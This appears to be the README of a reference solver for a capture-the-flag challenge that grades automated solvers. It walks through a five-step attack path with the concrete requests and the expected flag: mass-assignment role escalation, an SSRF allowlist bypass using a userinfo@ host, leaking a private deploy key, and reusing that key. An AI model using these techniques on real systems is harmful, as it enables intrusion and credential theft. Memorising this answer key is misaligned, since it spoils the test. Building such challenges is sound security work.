# Reference solution

`solve.py` is the canonical, reliable solution. It chains the five intended
stages and prints the flag. It also (optionally) writes a machine-readable
**transcript** that the grader consumes.

## Run against a running challenge

```bash
# 1) bring the challenge up (see repo README for the one-command options)
# 2) run the solver against the edge service
python solution/solve.py --base http://127.0.0.1:8080 --transcript run.json
```

Expected output:

```
[1] recon: render is operator-gated; internal upstream = http://collector:9000
[2] privesc: token role = operator
[3] ssrf: reached collector banner -> provue-collector
[4] exfil: recovered private deploy key = k-9f3a1c7b19e4d20a
[5] flag: flag{ssrf_pivot_collector_search_7b19e4}

Solved in 6 turns / 0.09s
flag{ssrf_pivot_collector_search_7b19e4}
```

## The intended attack path (what each turn does)

| # | Stage | Action | Vulnerability exploited |
|---|-------|--------|-------------------------|
| 1 | Recon | `GET /api/spec` | Verbose API surface leaks the internal upstream `collector:9000` and the operator gate on `render`. |
| 2 | Privilege escalation | `POST /api/session {"user":"solver","role":"operator"}` | **Mass assignment**: the request body is merged into the token claims, so `role` is attacker-controlled. |
| 3 | SSRF pivot | `POST /api/reports/render {"source":"http://telemetry.provue.internal@collector:9000/"}` | **Allowlist parser differential**: the approved host is checked with a naive substring test; a `userinfo@` component satisfies it while the real authority is the internal collector. |
| 4 | Exfiltration | same pivot to `/metrics?q=deploy` | **Broken function-level authorization**: the collector's full-text search returns whole documents and forgets to exclude the ones marked `private`, leaking the deploy key. |
| 5 | Credential reuse | `POST /api/reports/publish` with header `X-Deploy-Key: <key>` | The exfiltrated value is a **credential**, not the flag; presenting it to the operator publish endpoint releases the flag. |

## Why the obvious shortcuts don't work

- Hitting the collector directly is refused: it only answers requests carrying
  the edge-origin header, which only the edge tier injects (and in Docker it has
  no published port at all). You must pivot through `render`.
- A default (viewer) token cannot call `render` or `publish` (403).
- The approved host on its own does not resolve (offline), so the allowlist can
  only be *bypassed*, not satisfied.
- The `render`/exfil response never contains the flag — only the deploy key —
  so a solver must recognise the credential and take the final publish step.

These are asserted by `calibration/test_guardrails.py`.
